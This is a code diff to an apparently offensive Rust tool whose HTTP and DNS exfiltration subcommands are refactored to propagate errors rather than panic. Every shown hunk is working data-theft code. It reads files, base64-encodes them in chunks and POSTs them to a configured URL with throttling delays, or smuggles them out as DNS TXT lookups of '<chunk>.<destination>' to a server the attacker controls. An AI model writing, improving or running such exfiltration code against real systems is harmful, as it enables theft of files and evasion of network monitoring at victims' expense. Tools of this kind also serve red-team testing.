@@ -61,26 +61,27 @@ impl CommandHandler for HTTPExfiltrationSubCommand {
     /// 3. POST each encoded chunk to the configured `url` with Content-Type `text/plain`.
     /// 4. Sleep for `delay` milliseconds between requests.
     ///
-    /// This implementation uses blocking reqwest client calls and will panic on
-    /// any send/read error via `unwrap()`; callers may wrap or adapt for
-    /// production usage.
-    fn handle(self) {
-        self.files_path.iter().for_each(|file_path| {
+    /// Errors during file reading, encoding, or HTTP requests are propagated
+    /// via the `crate::error::Result` type.
+    fn handle(self) -> crate::error::Result<()> {
+        for file_path in self.files_path.iter() {
             println!("[*] Reading file {}", file_path.to_string_lossy());
 
-            crate::encoders::http::b64_encode_file(&file_path, self.chunks as usize)
-                .iter()
-                .inspect(|payload_chunk| println!("[*] Sending chunk: {}", payload_chunk))
-                .for_each(|payload_chunk| {
-                    reqwest::blocking::Client::new()
-                        .post(&self.url)
-                        .body(payload_chunk.to_owned())
-                        .header("Content-Type", "text/plain")
-                        .send()
-                        .unwrap();
-                    std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
-                });
-        });
+            for payload_chunk in
+                crate::encoders::http::b64_encode_file(&file_path, self.chunks as usize)?
+            {
+                println!("[*] Sending chunk: {}", payload_chunk);
+
+                reqwest::blocking::Client::new()
+                    .post(&self.url)
+                    .body(payload_chunk.to_owned())
+                    .header("Content-Type", "text/plain")
+                    .send()?;
+                std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
+            }
+        }
+
+        Ok(())
     }
 }
 
@@ -140,17 +141,17 @@ impl CommandHandler for DNSExfiltrationSubCommand {
     ///
     /// Notes:
     /// - The resolver uses the `hickory_resolver` crate and will build an
-    ///   async resolver instance. A temporary Tokio runtime is created for the
-    ///   lifetime of the operation to perform the lookups synchronously via
-    ///   `block_on`.
+    ///   async resolver instance. If a `nameserver` is provided, it will be
+    /// used; otherwise, the system default resolver configuration is used.
+    ///
     /// - Each encoded chunk is emitted as a TXT lookup for `<chunk>.<destination>.`
     ///   to the configured resolver; this allows an authoritative server for
     ///   `destination` to receive the payload via the query name.
-    fn handle(self) {
+    fn handle(self) -> crate::error::Result<()> {
         println!("[*] Reading file {}", self.file_path.to_string_lossy());
         println!("[*] Encoding payload.");
         let payload_chunks =
-            crate::encoders::dns::encode_payload_dns_safe(&self.file_path, &self.destination);
+            crate::encoders::dns::encode_payload_dns_safe(&self.file_path, &self.destination)?;
 
         let resolver_config = match self.nameserver {
             Some(name_server) => {
@@ -175,11 +176,13 @@ impl CommandHandler for DNSExfiltrationSubCommand {
 
         for chunk in payload_chunks.iter() {
             println!("[*] Sending chunk: {}", chunk);
-            let _ = tokio_runtime
-                .block_on(resolver.txt_lookup(format!("{}.{}.", chunk, self.destination)));
+            tokio_runtime
+                .block_on(resolver.txt_lookup(format!("{}.{}.", chunk, self.destination)))?;
 
             std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
         }
+
+        Ok(())
     }
 }
 
@@ -195,11 +198,13 @@ pub struct ExfiltrationSubCommandArgs {
 
 impl CommandHandler for ExfiltrationSubCommandArgs {
     /// Execute the selected exfiltration variant.
-    fn handle(self) {
+    fn handle(self) -> crate::error::Result<()> {
         match self.exfil_type {
-            ExfiltrationType::HTTP(exfil_http_subcmd) => exfil_http_subcmd.handle(),
-            ExfiltrationType::DNS(exfil_dns_subcmd) => exfil_dns_subcmd.handle(),
-        }
+            ExfiltrationType::HTTP(exfil_http_subcmd) => exfil_http_subcmd.handle()?,
+            ExfiltrationType::DNS(exfil_dns_subcmd) => exfil_dns_subcmd.handle()?,
+        };
+
+        Ok(())
     }
 }
 
